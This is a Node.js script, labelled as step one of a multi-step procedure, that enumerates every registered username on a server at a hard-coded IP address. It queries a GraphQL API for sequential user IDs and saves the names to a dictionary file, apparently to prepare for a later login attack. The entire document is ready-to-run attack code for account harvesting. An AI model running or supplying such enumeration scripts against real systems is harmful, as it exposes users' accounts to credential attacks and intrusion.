// Step 1: Create username dictionary
// Command: node 1_fetch_usernames.js
import fs from 'fs'
async function f(uid)
{
    const res =
    await fetch
    (
        "http://8.136.99.126/api", 
        {
            headers:
            [
                ["content-type", "application/json"],
                ["referer", "http://8.136.99.126/"],
            ],
            body:
                JSON.stringify
                (
                    {
                        "query":
                            "query Example($id: Int!)\n" + 
                            "{\n" + 
                            "    user(id: $id)\n" + 
                            "    {\n" + 
                            "        uname\n" + 
                            "    }\n" + 
                            "}\n",
                        "variables":
                        {
                            "id": uid
                        },
                        "operationName": "Example"
                    }
                ),
            method: "POST",
        }
    );
    if (!res.ok) return '';
    const data = await res.json();
    const user = data.data.user;
    if (user == null) return '';
    return user.uname;
}
fs.writeFileSync('usernames.txt', '');
let names = await f(1);
let index = 1;
while (names != '')
{
    fs.appendFileSync('usernames.txt', `${names}\n`);
    index = index + 1;
    names = await f(index);
}
fs.appendFileSync('usernames.txt', `!\n`);
index = index - 1;
console.log(`OK! ${index} registered users detected.`);
